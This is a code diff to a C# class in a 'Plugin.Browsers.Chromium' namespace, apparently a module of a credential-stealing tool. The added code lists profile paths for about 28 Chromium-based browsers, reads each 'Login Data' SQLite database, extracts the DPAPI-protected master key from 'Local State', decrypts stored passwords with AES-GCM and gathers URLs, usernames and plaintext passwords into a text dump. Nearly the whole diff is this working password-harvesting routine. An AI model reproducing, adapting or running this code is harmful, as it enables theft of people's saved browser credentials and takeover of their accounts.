@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
 using System.Text;
 using Plugin.Browsers.Chromium;
 
@@ -9,6 +10,8 @@ namespace Plugin.Browsers.Chromium
 {
     public class Chromium
     {
+        public static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
         public void CookiesRecovery(StringBuilder Coocks)
         {
@@ -118,154 +121,310 @@ namespace Plugin.Browsers.Chromium
             }
         }
 
-
-        public void Recovery(StringBuilder Pass)
+        public static StringBuilder Recovery(StringBuilder stringBuilder)
         {
-            try
+            Dictionary<string, string> ChromiumPaths = new Dictionary<string, string>()
             {
-                foreach (string str in this.GetAppDataFolders())
+                {
+                    "Chrome",
+                    LocalApplicationData + @"\Google\Chrome\User Data"
+                },
+                {
+                    "Opera",
+                    Path.Combine(ApplicationData, @"Opera Software\Opera Stable")
+                },
+                {
+                    "Yandex",
+                    Path.Combine(LocalApplicationData, @"Yandex\YandexBrowser\User Data")
+                },
+                {
+                    "360 Browser",
+                    LocalApplicationData + @"\360Chrome\Chrome\User Data"
+                },
+                {
+                    "Comodo Dragon",
+                    Path.Combine(LocalApplicationData, @"Comodo\Dragon\User Data")
+                },
+                {
+                    "CoolNovo",
+                    Path.Combine(LocalApplicationData, @"MapleStudio\ChromePlus\User Data")
+                },
+                {
+                    "SRWare Iron",
+                    Path.Combine(LocalApplicationData, @"Chromium\User Data")
+                },
+                {
+                    "Torch Browser",
+                    Path.Combine(LocalApplicationData, @"Torch\User Data")
+                },
+                {
+                    "Brave Browser",
+                    Path.Combine(LocalApplicationData, @"BraveSoftware\Brave-Browser\User Data")
+                },
+                {
+                    "Iridium Browser",
+                    LocalApplicationData + @"\Iridium\User Data"
+                },
+                {
+                    "7Star",
+                    Path.Combine(LocalApplicationData, @"7Star\7Star\User Data")
+                },
+                {
+                    "Amigo",
+                    Path.Combine(LocalApplicationData, @"Amigo\User Data")
+                },
+                {
+                    "CentBrowser",
+                    Path.Combine(LocalApplicationData, @"CentBrowser\User Data")
+                },
+                {
+                    "Chedot",
+                    Path.Combine(LocalApplicationData, @"Chedot\User Data")
+                },
+                {
+                    "CocCoc",
+                    Path.Combine(LocalApplicationData, @"CocCoc\Browser\User Data")
+                },
+                {
+                    "Elements Browser",
+                    Path.Combine(LocalApplicationData, @"Elements Browser\User Data")
+                },
+                {
+                    "Epic Privacy Browser",
+                    Path.Combine(LocalApplicationData, @"Epic Privacy Browser\User Data")
+                },
+                {
+                    "Kometa",
+                    Path.Combine(LocalApplicationData, @"Kometa\User Data")
+                },
+                {
+                    "Orbitum",
+                    Path.Combine(LocalApplicationData, @"Orbitum\User Data")
+                },
+                {
+                    "Sputnik",
+                    Path.Combine(LocalApplicationData, @"Sputnik\Sputnik\User Data")
+                },
+                {
+                    "uCozMedia",
+                    Path.Combine(LocalApplicationData, @"uCozMedia\Uran\User Data")
+                },
+                {
+                    "Vivaldi",
+                    Path.Combine(LocalApplicationData, @"Vivaldi\User Data")
+                },
+                {
+                    "Sleipnir 6",
+                    Path.Combine(ApplicationData, @"Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer")
+                },
+                {
+                    "Citrio",
+                    Path.Combine(LocalApplicationData, @"CatalinaGroup\Citrio\User Data")
+                },
+                {
+                    "Coowon",
+                    Path.Combine(LocalApplicationData, @"Coowon\Coowon\User Data")
+                },
+                {
+                    "Liebao Browser",
+                    Path.Combine(LocalApplicationData, @"liebao\User Data")
+                },
+                {
+                    "QIP Surf",
+                    Path.Combine(LocalApplicationData, @"QIP Surf\User Data")
+                },
+                {
+                    "Edge Chromium",
+                    Path.Combine(LocalApplicationData, @"Microsoft\Edge\User Data")
+                }
+            };
+
+            var list = new List<Account>();
+
+            foreach (var item in ChromiumPaths)
+                list.AddRange(Accounts(item.Value, item.Key));
+
+            foreach (var b in list)
+            {
+                stringBuilder.Append("Url: " + b.URL + "\n");
+                stringBuilder.Append("Username: " + b.UserName + "\n");
+                stringBuilder.Append("Password: " + b.Password + "\n");
+                stringBuilder.Append("Application: " + b.Application + "\n");
+                stringBuilder.Append("=============================" + "\n");
+            }
+
+            return stringBuilder;
+        }
+
+        private static List<Account> Accounts(string path, string browser, string table = "logins")
+        {
+
+            //Get all created profiles from browser path
+            List<string> loginDataFiles = GetAllProfiles(path);
+
+            List<Account> data = new List<Account>();
+
+            foreach (string loginFile in loginDataFiles.ToArray())
+            {
+                if (!File.Exists(loginFile))
+                    continue;
+
+                SQLiteHandler SQLDatabase;
+
+                try
+                {
+                    SQLDatabase = new SQLiteHandler(loginFile); //Open database with Sqlite
+                }
+                catch (System.Exception ex)
+                {
+                    Console.WriteLine(ex.ToString());
+                    continue;
+                }
+
+                if (!SQLDatabase.ReadTable(table))
+                    continue;
+
+                for (int I = 0; I <= SQLDatabase.GetRowCount() - 1; I++)
                 {
                     try
                     {
-                        string[] browser = {
-                            str + "\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
-                            str + "\\Roaming\\Opera Software\\Opera Stable\\Login Data",
-                            str + "\\Local\\Vivaldi\\User Data\\Default\\Login Data",
-                            str + "\\Local\\Chromium\\User Data\\Default\\Login Data",
-                            str + "\\Local\\Torch\\User Data\\Default\\Login Data",
-                            str + "\\Local\\Comodo\\Dragon\\User Data\\Default\\Login Data",
-                            str + "\\Local\\Xpom\\User Data\\Default\\Login Data",
-                            str + "\\Local\\Orbitum\\User Data\\Default\\Login Data",
-                            str + "\\Local\\Kometa\\User Data\\Default\\Login Data",
-                            str + "\\Local\\Amigo\\User Data\\Default\\Login Data",
-                            str + "\\Local\\Nichrome\\User Data\\Default\\Login Data",
-                            str + "\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
-                            str + "\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data",
-                        };
+                        //Get values with row number and column name
+                        string host = SQLDatabase.GetValue(I, "origin_url");
+                        string username = SQLDatabase.GetValue(I, "username_value");
+                        string password = SQLDatabase.GetValue(I, "password_value");
 
-                        int selected = 0;
-                        foreach (string b in browser)
+                        if (password != null)
                         {
-                            if (File.Exists(b))
+                            //check v80 password signature. its starting with v10 or v11
+                            if (password.StartsWith("v10") || password.StartsWith("v11"))
                             {
-                                SQLiteHandler sqliteHandler = new SQLiteHandler(b);
-                                try
-                                {
-                                    sqliteHandler.ReadTable("logins");
-                                }
-                                catch
-                                {
-                                }
+                                //Local State file located in the parent folder of profile folder.
+                                byte[] masterKey = GetMasterKey(Directory.GetParent(loginFile).Parent.FullName);
 
-                                switch (selected)
-                                {
-                                    case 0:
-                                        Pass.Append("\n== Chrome ==========\n");
-                                        break;
-                                    case 1:
-                                        Pass.Append("\n== Opera ===========\n");
-                                        break;
-                                    case 2:
-                                        Pass.Append("\n== Vivaldi ===========\n");
-                                        break;
-                                    case 3:
-                                        Pass.Append("\n== Chromium ===========\n");
-                                        break;
-                                    case 4:
-                                        Pass.Append("\n== Torch ===========\n");
-                                        break;
-                                    case 5:
-                                        Pass.Append("\n== Comodo ===========\n");
-                                        break;
-                                    case 6:
-                                        Pass.Append("\n== Xpom ===========\n");
-                                        break;
-                                    case 7:
-                                        Pass.Append("\n== Orbitum ===========\n");
-                                        break;
-                                    case 8:
-                                        Pass.Append("\n== Kometa ===========\n");
-                                        break;
-                                    case 9:
-                                        Pass.Append("\n== Amigo ===========\n");
-                                        break;
-                                    case 10:
-                                        Pass.Append("\n== Nichrome ===========\n");
-                                        break;
-                                    case 11:
-                                        Pass.Append("\n== Brave ===========\n");
-                                        break;
-                                    case 12:
-                                        Pass.Append("\n== Yandex ===========\n");
-                                        Pass.Append("Not Work for now!\n");
-                                        break;
-                                }
-                            
-                                for (int j = 0; j <= sqliteHandler.GetRowCount() - 1; j++)
-                                {
-                                    string value = sqliteHandler.GetValue(j, "origin_url");
-                                    string value2 = sqliteHandler.GetValue(j, "username_value");
-                                    string value3 = sqliteHandler.GetValue(j, "password_value");
-                                    string text = string.Empty;
-                                    if (!string.IsNullOrEmpty(value3))
-                                    {
-                                        text = this.Decrypt(Encoding.Default.GetBytes(value3));
-                                    }
-                                    else
-                                    {
-                                        text = "";
-                                    }
-                                    Pass.Append(string.Concat(new string[]
-                                    {
-                                        value,
-                                        "\nU: ",
-                                        value2,
-                                        "\nP: ",
-                                        text,
-                                        "\n\n"
-                                    }));
-                                }
+                                if (masterKey == null)
+                                    continue;
 
+                                password = DecryptWithKey(Encoding.Default.GetBytes(password), masterKey);
                             }
-
-                            selected++;
+                            else
+                                password = Decrypt(password); //Old versions using UnprotectData for decryption without any key
                         }
+                        else
+                            continue;
+
+                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
+                            data.Add(new Account() { URL = host, UserName = username, Password = password, Application = browser });
                     }
-                    catch (Exception)
+                    catch (Exception ex)
                     {
+                        Console.WriteLine(ex.ToString());
                     }
                 }
             }
-            catch
+
+            return data;
+        }
+
+        private static List<string> GetAllProfiles(string DirectoryPath)
+        {
+            List<string> loginDataFiles = new List<string>
             {
+                DirectoryPath + @"\Default\Login Data",
+                DirectoryPath + @"\Login Data"
+            };
+
+            if (Directory.Exists(DirectoryPath))
+            {
+                foreach (string dir in Directory.GetDirectories(DirectoryPath))
+                {
+                    if (dir.Contains("Profile"))
+                        loginDataFiles.Add(dir + @"\Login Data");
+                }
+            }
+
+            return loginDataFiles;
+        }
+
+        public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
+        {
+            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // IV 12 bytes
+
+            //trim first 3 bytes(signature "v10") and take 12 bytes after signature.
+            Array.Copy(encryptedData, 3, iv, 0, 12);
+
+            try
+            {
+                //encryptedData without IV
+                byte[] Buffer = new byte[encryptedData.Length - 15];
+                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15);
+
+                byte[] tag = new byte[16]; //AuthTag
+                byte[] data = new byte[Buffer.Length - tag.Length]; //Encrypted Data
+
+                //Last 16 bytes for tag
+                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);
+
+                //encrypted password
+                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);
+
+                AesGcm aesDecryptor = new AesGcm();
+                var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag));
+
+                return result;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+                return null;
             }
         }
 
-        private string Decrypt(byte[] Datas)
+        public static byte[] GetMasterKey(string LocalStateFolder)
         {
-            string result;
+            //Key saved in Local State file
+            string filePath = LocalStateFolder + @"\Local State";
+            byte[] masterKey = new byte[] { };
+
+            if (File.Exists(filePath) == false)
+                return null;
+
+            //Get key with regex.
+            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));
+
+            foreach (System.Text.RegularExpressions.Match prof in pattern)
+            {
+                if (prof.Success)
+                    masterKey = Convert.FromBase64String((prof.Groups[1].Value)); //Decode base64
+            }
+
+            //Trim first 5 bytes. Its signature "DPAPI"
+            byte[] temp = new byte[masterKey.Length - 5];
+            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);
+
             try
             {
-                Chromium.DATA_BLOB data_BLOB = default(Chromium.DATA_BLOB);
-                Chromium.DATA_BLOB data_BLOB2 = default(Chromium.DATA_BLOB);
-                GCHandle gchandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
-                Chromium.DATA_BLOB data_BLOB3;
-                data_BLOB3.pbData = gchandle.AddrOfPinnedObject();
-                data_BLOB3.cbData = Datas.Length;
-                gchandle.Free();
-                Chromium.CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT = default(Chromium.CRYPTPROTECT_PROMPTSTRUCT);
-                string empty = string.Empty;
-                Chromium.CryptUnprotectData(ref data_BLOB3, null, ref data_BLOB2, (IntPtr)0, ref cryptprotect_PROMPTSTRUCT, (Chromium.CryptProtectFlags)0, ref data_BLOB);
-                byte[] array = new byte[data_BLOB.cbData + 1];
-                Marshal.Copy(data_BLOB.pbData, array, 0, data_BLOB.cbData);
-                string @string = Encoding.UTF8.GetString(array);
-                result = @string.Substring(0, @string.Length - 1);
+                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
             }
-            catch
+            catch (Exception ex)
             {
-                result = "";
+                Console.WriteLine(ex.ToString());
+                return null;
             }
-            return result;
+        }
+
+        public static string Decrypt(string encryptedData)
+        {
+            if (encryptedData == null || encryptedData.Length == 0)
+                return null;
+            try
+            {
+                return Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), null, DataProtectionScope.CurrentUser));
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+                return null;
+            }
         }
 
         private string[] GetAppDataFolders()
@@ -279,52 +438,5 @@ namespace Plugin.Browsers.Chromium
             }
             return list.ToArray();
         }
-
-        [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool CryptProtectData(ref Chromium.DATA_BLOB pDataIn, string szDataDescr, ref Chromium.DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref Chromium.CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, Chromium.CryptProtectFlags dwFlags, ref Chromium.DATA_BLOB pDataOut);
-
-        [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool CryptUnprotectData(ref Chromium.DATA_BLOB pDataIn, StringBuilder szDataDescr, ref Chromium.DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref Chromium.CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, Chromium.CryptProtectFlags dwFlags, ref Chromium.DATA_BLOB pDataOut);
-
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        private struct DATA_BLOB
-        {
-            public int cbData;
-
-            public IntPtr pbData;
-        }
-
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        private struct CRYPTPROTECT_PROMPTSTRUCT
-        {
-            public int cbSize;
-
-            public Chromium.CryptProtectPromptFlags dwPromptFlags;
-
-            public IntPtr hwndApp;
-
-            public string szPrompt;
-        }
-
-        [Flags]
-        private enum CryptProtectPromptFlags
-        {
-            CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
-            CRYPTPROTECT_PROMPT_ON_PROTECT = 2
-        }
-
-        [Flags]
-        private enum CryptProtectFlags
-        {
-            CRYPTPROTECT_UI_FORBIDDEN = 1,
-            CRYPTPROTECT_LOCAL_MACHINE = 4,
-            CRYPTPROTECT_CRED_SYNC = 8,
-            CRYPTPROTECT_AUDIT = 16,
-            CRYPTPROTECT_NO_RECOVERY = 32,
-            CRYPTPROTECT_VERIFY_PROTECTION = 64
-        }
-
     }
 }
